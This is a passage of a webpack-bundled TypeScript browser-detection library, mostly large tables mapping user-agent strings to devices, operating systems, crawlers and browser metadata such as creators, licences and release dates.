"use strict";
(self["webpackChunk"] = self["webpackChunk"] || []).push([["monitor"],{

/***/ "./Assets/typescripts/classes/browser.ts":
/*!***********************************************!*\
  !*** ./Assets/typescripts/classes/browser.ts ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Browser": () => (/* binding */ Browser)
/* harmony export */ });
/**
 * Browser (typescript language) Library
 * Developer: Mr Al-Amin Ahmed Abir
 * Website: https://www.mishusoft.com
 * Official Link: https://www.mishusoft.com/libraries/js/browser.js
 * */
/*import {sendRequest} from "./app-common-required-send";*/
class Browser {
    VERSION = '1.0.2';
    /*cdn link*/
    cdnUrl = '';
    UserAgent = navigator.userAgent;
    browserName = 'Unknown';
    browserNameFull = 'Unknown';
    browserVersion = 'Unknown';
    browserVersionFull = 'Unknown';
    browserArchitecture = 'Unknown';
    browserAppName = 'Unknown';
    browserAppNameFull = 'Unknown';
    browserAppVersion = 'Unknown';
    browserAppCodeName = 'Unknown';
    browserAppCodeVersion = 'Unknown';
    browserEngineName = 'Unknown';
    browserEngineNameFull = 'Unknown';
    browserEngineVersion = 'Unknown';
    browserInfoAll = [];
    deviceName = 'Unknown';
    deviceType = 'Unknown';
    deviceArchitecture = 'Unknown';
    deviceWindowManager = 'Unknown';
    deviceInfoAll;
    deviceNameFull;
    deviceNameOriginal = 'Unknown';
    deviceWmNameOriginal = 'Unknown';
    currentDeviceInfo;
    /*url info*/
    URLProtocol = window.location.protocol;
    URLHostname = window.location.hostname;
    URLPath = window.location.pathname;
    URLPathFull = window.location.href;
    /*device screen info*/
    DeviceScreenWidth = window.screen.width;
    DeviceScreenHeight = window.screen.height;
    DeviceScreenColorDepth = window.screen.colorDepth;
    DeviceScreenPixelDepth = window.screen.pixelDepth;
    UserAgentList;
    devicesList;
    devicesCategoryList;
    devicesArchitectureList;
    devicesPlatformWMNameList;
    webBrowserList;
    webBrowserLayoutList;
    webBrowserAppCodeNameList;
    constructor() {
        /*Device List*/
        this.devicesList = {
            "3DS": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "DSi": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "Presto.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo DSi", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "DSi", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "New 3DS": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "New 3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "Playstation Portable": {
                "Browser": {
                    "name": "Sony PSP",
                    "architecture": "32-bit",
                    "developer": "Sony",
                    "type": "Browser."
                },
                "Platform": { "name": "JAVA", "architecture": "32-bit", "developer": "Oracle" },
                "Device": { "name": "Playstation Portable", "type": "Console", "vendor": "Sony", "brand": "Sony" }
            },
            "PlayStation Vita": {
                "Browser": {
                    "name": "Playstation Browser",
                    "developer": "Sony",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "PlayStation Vita", "developer": "Oracle" },
                "Device": { "name": "PlayStation Vita", "type": "Console", "vendor": "Sony", "brand": "Sony" }
            },
            "Switch": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo Switch", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "Switch", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "Amiga": {
                "Browser": {
                    "name": "IBrowse",
                    "architecture": "32-bit",
                    "developer": "Stefan Burstroem",
                    "type": "Browser."
                },
                "Platform": { "name": "Amiga OS", "architecture": "32-bit", "developer": "Commodore International" },
                "Device": {
                    "name": "Amiga",
                    "type": "Desktop",
                    "vendor": "Commodore International",
                    "brand": "Commodore"
                }
            },
            "DA241HL": {
                "Browser": {
                    "name": "Chrome",
                    "architecture": "32-bit",
                    "developer": "Google Inc",
                    "type": "Browser."
                },
                "Platform": { "name": "Android", "architecture": "32-bit", "developer": "Google Inc" },
                "Device": { "name": "DA 241HL", "type": "Desktop", "vendor": "Acer", "brand": "Acer" }
            },
            "tesla": {
                "Browser": {
                    "name": "Tesla Car Browser",
                    "architecture": "32-bit",
                    "developer": "Tesla Motors.",
                    "rendering engine": "Blink.",
                    "type": "Browser."
                },
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": {
                    "name": "Car",
                    "type": "Car Entertainment Framework",
                    "vendor": "Tesla Motors",
                    "brand": "Tesla"
                }
            },
            "QtCarBrowser": {
                "Browser": {
                    "name": "Tesla Car Browser",
                    "architecture": "32-bit",
                    "developer": "Tesla Motors.",
                    "rendering engine": "Blink.",
                    "type": "Browser."
                },
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": {
                    "name": "Car",
                    "type": "Car Entertainment Framework",
                    "vendor": "Tesla Motors",
                    "brand": "Tesla"
                }
            },
            "freebsd": {
                "Platform": { "name": "FreeBSD", "architecture": "32-bit", "developer": "FreeBSD Foundation" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "CrOS": {
                "Platform": { "name": "Chrome OS", "architecture": "32-bit", "developer": "Google Inc" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "Ubuntu": {
                "Platform": { "name": "Ubuntu OS", "architecture": "32-bit", "developer": "Canonical Inc" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "Arch Linux": {
                "Platform": { "name": "Arch Linux", "architecture": "32-bit", "developer": "Arch Linux" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "linux": {
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "debian": "Debian",
            "manjaro": "manjaro",
            "sunos": "Sun Solaris",
            "beos": "BeOS",
            "apachebench": "ApacheBench",
            "aix": "AIX",
            "irix": "Irix",
            "osf": "DEC OSF",
            "hp-ux": "HP-UX",
            "netbsd": "NetBSD",
            "bsdi": "BSDi",
            "openbsd": "OpenBSD",
            "gnu": "GNU\/Linux",
            "unix": "Unknown Unix OS",
            "ubuntu": "Ubuntu",
            "RISC OS": "RISC OS",
            "Darwin": "MAC OS",
            "Haiku": "Haiku OS",
            "FreeMiNT": "FreeMiNT OS",
            "windows phone 8": {
                "Platform": {
                    "name": "Windows Phone 8",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Windows Phone", "type": "phone" }
            },
            "windows phone os 7": {
                "Platform": {
                    "name": "Windows Phone 7",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Windows Phone", "type": "phone" }
            },
            "windows nt 10": {
                "Platform": {
                    "name": "Windows 10",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.3": {
                "Platform": {
                    "name": "Windows 8.1",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.2": {
                "Platform": {
                    "name": "Windows 8",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.1": {
                "Platform": {
                    "name": "Windows 7",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.0": {
                "Platform": {
                    "name": "Windows Longhorn",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.2": {
                "Platform": {
                    "name": "Windows 2003",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.1": {
                "Platform": {
                    "name": "Windows XP",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows xp": {
                "Platform": { "name": "Windows XP", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.0": {
                "Platform": {
                    "name": "Windows 2000",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows me": {
                "Platform": { "name": "Windows ME", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 4.0": {
                "Platform": {
                    "name": "Windows NT 4.0",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winnt4.0": {
                "Platform": {
                    "name": "Windows NT 4.0",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winnt 4.0": {
                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winn\\\/t": {
                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows 98": {
                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win98": {
                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows 95": {
                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win95": {
                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win16": {
                "Platform": { "name": "Windows 3.11", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "ppc": "Macintosh",
            "macintosh|mac os x": "Mac OS X",
            "mac_powerpc": "Mac OS 9",
            "os x": "Mac OS X",
            "ppc mac": "Power PC Mac",
            "android": "Android",
            "webos": "Mobile",
            "mobileexplorer": "Mobile Explorer",
            "palmsource": "Palm",
            "palmscape": "Palmscape",
            "motorola": "Motorola",
            "nokia": "Nokia",
            "iphone": "Apple iPhone",
            "ipad": "iPad",
            "ipod": "Apple iPod Touch",
            "sony": "Sony Ericsson",
            "ericsson": "Sony Ericsson",
            "blackberry": "BlackBerry",
            "cocoon": "O2 Cocoon",
            "blazer": "Treo",
            "lg": "LG",
            "amoi": "Amoi",
            "xda": "XDA",
            "mda": "MDA",
            "vario": "Vario",
            "htc": "HTC",
            "samsung": "Samsung",
            "sharp": "Sharp",
            "sie-": "Siemens",
            "alcatel": "Alcatel",
            "benq": "BenQ",
            "ipaq": "HP iPaq",
            "mot-": "Motorola",
            "playstation portable": "PlayStation Portable",
            "hiptop": "Danger Hiptop",
            "nec-": "NEC",
            "panasonic": "Panasonic",
            "philips": "Philips",
            "sagem": "Sagem",
            "sanyo": "Sanyo",
            "spv": "SPV",
            "zte": "ZTE",
            "sendo": "Sendo",
            "symbian": "Symbian",
            "SymbianOS": "SymbianOS",
            "elaine": "Palm",
            "palm": "Palm",
            "series60": "Symbian S60",
            "windows ce": "Windows CE",
            "obigo": "Obigo",
            "netfront": "Netfront Browser",
            "openwave": "Openwave Browser",
            "mobilexplorer": "Mobile Explorer",
            "operamini": "Opera Mini",
            "opera mini": "Opera Mini",
            "digital paths": "Digital Paths",
            "avantgo": "AvantGo",
            "xiino": "Xiino",
            "novarra": "Novarra Transcoder",
            "vodafone": "Vodafone",
            "docomo": "NTT DoCoMo",
            "o2": "O2",
            "mobile": "Generic Mobile",
            "wireless": "Generic Mobile",
            "j2me": "Generic Mobile",
            "midp": "Generic Mobile",
            "cldc": "Generic Mobile",
            "up.link": "Generic Mobile",
            "up.browser": "Generic Mobile",
            "smartphone": "Generic Mobile",
            "cellphone": "Generic Mobile",
            "Raspbian": {
                "Platform": {
                    "name": "Raspbian Pi",
                    "architecture": "32-bit",
                    "developer": "Raspberry Pi Foundation"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "Mail.RU_Bot": {
                "Platform": { "name": "Mail.ru Crawler", "architecture": "32-bit", "developer": "Mail RU" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "Googlebot": {
                "Platform": {
                    "name": "Googlebot Crawler",
                    "architecture": "32-bit",
                    "developer": "Google Inc"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "Baiduspider": {
                "Platform": { "name": "Baidu Spider", "architecture": "32-bit", "developer": "Baidu Inc" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "bingbot": {
                "Platform": { "name": "Bing Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "msnbot": {
                "Platform": { "name": "MSN Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "MJ12bot": {
                "Platform": {
                    "name": "Majestic-12 Distributed Search Bot",
                    "architecture": "32-bit",
                    "developer": "Majestic"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "Yahoo! Slurp": {
                "Platform": {
                    "name": "Yahoo! Slurp Web Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "Yahoo LLC"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "MegaIndex.ru": {
                "Platform": {
                    "name": "MegaIndex Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "MegaIndex.ru"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "AhrefsBot": {
                "Platform": {
                    "name": "Ahrefs Backlink Research Bot",
                    "architecture": "32-bit",
                    "developer": "Ahrefs"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "DotBot": {
                "Platform": {
                    "name": "OpenSite Explorer Crawler",
                    "architecture": "32-bit",
                    "developer": "The Moz"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "JobboerseBot": {
                "Platform": {
                    "name": "Jobboerse Crawler",
                    "architecture": "32-bit",
                    "developer": "jobboerse.com"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "SemrushBot": {
                "Platform": { "name": "SEMRush Crawler", "architecture": "32-bit", "developer": "SEMrush" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "YandexBot": {
                "Platform": { "name": "Yandex Search Bot", "architecture": "32-bit", "developer": "Yandex" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "seoscanners.net": {
                "Platform": {
                    "name": "SEO Scanners Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "SEO Scanners"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "SEOkicks-Robot": {
                "Platform": {
                    "name": "SEOkicks Crawler",
                    "architecture": "32-bit",
                    "developer": "SEOkicks"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "CheckMarkNetwork": {
                "Platform": {
                    "name": "CheckMark Network Crawler",
                    "architecture": "32-bit",
                    "developer": "CheckMark"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "BingPreview": {
                "Platform": {
                    "name": "Bing Preview Snapshot Generator",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "VoilaBot BETA": {
                "Platform": {
                    "name": "VoilaBot BETA",
                    "architecture": "32-bit",
                    "developer": "orange ft group"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "adscanner": {
                "Platform": { "name": "AdScanner Crawler", "architecture": "32-bit", "developer": "AdScanner" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "Qwantify": {
                "Platform": {
                    "name": "Qwantify Search Crawler",
                    "architecture": "32-bit",
                    "developer": "Qwantify"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "apple tv": { "name": "AppleTV", "device": "Television", "manufacture": "Apple Inc." },
            "chromecast": { "name": "Chromecast", "device": "Television", "manufacture": "Google Inc." },
            "aftb": { "name": "Fire TV", "device": "Television", "manufacture": "Amazon.com, Inc." },
            "freebox": { "name": "Freebox Revolution", "device": "Television", "manufacture": "FREE SAS." },
            "googletv": { "name": "Google TV", "device": "Television", "manufacture": "Sony." },
            "netbox": { "name": "Netbox", "device": "Television", "manufacture": "Sony." },
            "playstation 3": { "name": "Playstation 3", "device": "Television", "manufacture": "Sony." },
            "playstation 4": { "name": "Playstation 4", "device": "Television", "manufacture": "Sony." },
            "kdl32Cx525": { "name": "KDL32CX525", "tdeviceype": "Television", "manufacture": "Sony." },
            "nsz-gs7\\\/gx70": { "name": "NSZ-GS7\/GX70", "device": "Television", "manufacture": "Sony." },
            "h96 pro\\+": { "name": "H96 Pro+", "device": "Television", "manufacture": "Alfawise." },
            "mx enjoy tv": { "name": "MX Enjoy TV BOX", "device": "Television", "manufacture": "Geniatech." },
            "smarttv2016": { "name": "Series J (2016)", "device": "Television", "manufacture": "Samsung." },
            "smart-tv": { "name": "Smart TV", "device": "Television", "manufacture": "Samsung." },
            "tpm171e": { "name": "TPM171E", "device": "Television", "manufacture": "Philips." },
            "smarttva": { "name": "TV", "device": "Television", "manufacture": "LG." },
            "vap430": { "name": "VAP430", "device": "Television", "manufacture": "Vizio." },
            "viera": { "name": "Viera TV", "device": "Television", "manufacture": "Panasonic." },
            "webtv": { "name": "WebTV", "device": "Television", "manufacture": "Microsoft." },
            "xbox": { "name": "Xbox 360", "device": "Television", "manufacture": "Microsoft." },
            "xbox one": { "name": "Xbox One", "device": "Television", "manufacture": "Microsoft." },
            "wii": { "name": "Wii", "device": "Television", "manufacture": "Nintendo." },
            "wiiu": { "name": "WiiU", "device": "Television", "manufacture": "Nintendo." },
            "x96 mini": { "name": "X96 mini", "device": "Television", "manufacture": "ShySky." }
        };
        /*Devices Categories*/
        this.devicesCategoryList = {
            'linux': 'linux',
            'mac': 'mac',
            'win': 'win',
            'mobi': 'mobi',
        };
        /*Devices architecture List*/
        this.devicesArchitectureList = {
            "ARMv1": "32 bit",
            "ARMv2": "32 bit",
            "ARMv3": "32 bit",
            "ARMv4": "32 bit",
            "ARMv4T": "32 bit",
            "ARMv5TE": "32 bit",
            "ARMv6": "32 bit",
            "ARMv6-M": "32 bit",
            "ARMv7-M": "32 bit",
            "ARMv7E-M": "32 bit",
            "ARMv8-M": "32 bit",
            "ARMv7-R": "32 bit",
            "ARMv8-R": "32 bit",
            "ARMv7-A": "32 bit",
            "ARMv8-A": "64 bit",
            "ARMv8.1-A": "64\/32 bit",
            "ARMv8.2-A": "64\/32 bit",
            "ARMv8.3-A": "64\/32 bit",
            "ARMv8.4-A": "64\/32 bit",
            "ARMv8.5-A": "64\/32 bit",
            "ARMv8.6-A": "64\/32 bit",
            "i286": "16 Bit",
            "Win16": "16 Bit",
            "i386": "32 Bit",
            "i486": "32 Bit",
            "i586": "32 Bit",
            "i686": "32 Bit",
            "i786": "32 Bit",
            "x86": "32 Bit",
            "x64": "64 Bit",
            "WOW64": "64 Bit",
            "Win64": "64 Bit",
            "x86_64": "64 Bit",
            "x86-64": "64 Bit",
            "x64\\\/x86": "64 Bit",
            "IA-64": "64 Bit",
            "ARM64": "64 Bit",
            "AMD64": "64 Bit",
            "Intel64": "64 Bit"
        };
        /*Platform's Window Manager*/
        this.devicesPlatformWMNameList = {
            'x11': { 'name': 'Linux Desktop,', 'type': 'X11 Window Manager.' },
            'win': { 'name': 'Windows Desktop,', 'type': 'Windows Window Manager.', },
            'mac': { 'name': 'Macintosh,', 'type': 'Mac Window Manager.', },
        };
        /*Web Browser List*/
        this.webBrowserList = {
            "007ac9 Crawler": {
                "name": "007ac9 Crawler",
                "type": "Crawler",
                "ui": "FullTextMode",
                "developer": "007ac9",
                "link": "http:\/\/crawler.007ac9.net"
            },
            "115Browser": {
                "name": "115 Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "115 Team",
                        "link": "https:\/\/115.com\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "126BROWSER": {
                "name": "126 BROWSER",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Unknown"
                    }
                ],
                "cost": "Free",
                "status": "Unknown",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "1337Browser": {
                "name": "1337 Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Unknown"
                    }
                ],
                "cost": "Free",
                "status": "Unknown",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "1Password": {
                "name": "1 Password",
                "type": "Password Manager",
                "ui": "FullTextMode",
                "creator": [
                    {
                        "name": "AgileBits Inc",
                        "link": "https:\/\/1password.com\/"
                    }
                ],
                "cost": "Trialware",
                "status": "Active",
                "licence": [
                    {
                        "name": "Trialware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trialware"
                    }
                ],
                "layout": [
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "7.5.1",
                        "date": "May 4, 2020"
                    },
                    "iOS": {
                        "version": "7.5.2",
                        "date": "April 22, 2020"
                    },
                    "macOS": {
                        "version": "7.5",
                        "date": "May 5, 2020"
                    },
                    "Windows": {
                        "version": "7.4.767",
                        "date": "April 27, 2020"
                    }
                }
            },
            "1stBrowser": "1st Browser",
            "2345Explorer": "2345 Explorer",
            "Mb2345Browser": "2345 Browser",
            "2345chrome": "2345 Chrome",
            "360SE": "360 Secure Browser",
            "Amaya": {
                "name": "Amaya",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "W3C",
                        "link": "https:\/\/www.w3.org\/"
                    },
                    {
                        "name": "INRIA",
                        "link": "http:\/\/www.inria.fr\/en\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "W3C",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/W3C_Software_Notice_and_License"
                    }
                ],
                "layout": "custom",
                "latest-release": {
                    "version": "11.4.4",
                    "date": "January 18, 2012"
                }
            },
            "AOL": {
                "name": "AOL Explorer",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "America Online, Inc",
                        "link": "https:\/\/www.aol.com\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
                    }
                ],
                "latest-release": {
                    "version": "1.5",
                    "date": "May 10, 2016"
                }
            },
            "Arora": {
                "name": "Arora",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Avant Force"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "version": "0.11.0",
                    "date": "27 September 2010"
                }
            },
            "Avant": {
                "name": "Avant ",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Benjamin C. Meyer"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(layout_engine)"
                    },
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "version": "2020 build 3",
                    "date": "March 17, 2020"
                }
            },
            "Basilisk": {
                "name": "Basilisk ",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Moonchild Productions",
                        "link": "https:\/\/www.basilisk-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Goanna",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
                    }
                ],
                "latest-release": {
                    "version": "2020.10.05",
                    "date": "5 October 2020"
                }
            },
            "Blisk": {
                "name": "Blisk",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Blisk team"
                    }
                ],
                "cost": {
                    "Free": "Limited",
                    "Paid": "Unlimited Pro"
                },
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    },
                    {
                        "name": "V8",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
                    }
                ],
                "latest-release": {
                    "version": "12.0.92.83",
                    "date": "June 29, 2019"
                }
            },
            "BeakerBrowser": {
                "name": "Beaker",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Blue Link Labs",
                        "link": "https:\/\/beakerbrowser.com\/about"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MIT License",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "macOS": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    },
                    "Windows": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    },
                    "Linux": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    }
                }
            },
            "Electron": {
                "name": "Electron",
                "type": "Electron (software framework)",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "GitHub",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GitHub"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MIT License",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "10.1.5",
                        "date": "23 October 2020"
                    },
                    "Preview release": {
                        "version": "11.0.0-beta.16",
                        "date": "24 October 2020"
                    }
                }
            },
            "Brave": {
                "name": "Brave Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Brave Software Inc",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Brave_(browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.15.73",
                        "date": "15 October 2020"
                    },
                    "iOS": {
                        "version": "1.20",
                        "date": "25 September 2020"
                    },
                    "macOS": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    },
                    "Windows": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    },
                    "Linux": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    }
                }
            },
            "Camino": {
                "name": "Camino",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Camino Project"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "MPL 1.1",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    },
                    {
                        "name": "GPL",
